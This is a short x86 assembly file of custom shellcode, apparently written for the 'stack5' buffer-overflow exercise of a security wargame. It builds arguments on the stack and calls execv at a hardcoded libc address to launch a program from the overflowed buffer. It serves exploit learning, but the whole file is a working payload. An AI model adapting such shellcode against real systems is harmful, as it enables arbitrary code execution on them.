
# Compile with: gcc -c custom-shellcode.s


.intel_syntax noprefix
.text

int3  # Cause debugger to stop in order to debug our shellcode

# Use relative addresses to load the address of buffer to ebx
mov ebx, esp
sub ebx, 0x50

# 2nd arguemnt - Address of the array of strings == Address of buffer + 0xb
mov eax, ebx
add eax, 0xb
push eax

# 1st argument - Address of the string name for the executable == Address of buffer
push ebx

# call execv. This is the address of execv as it is mapped in the stack5 binary.
mov eax, 0xb7f2e2c0
call eax
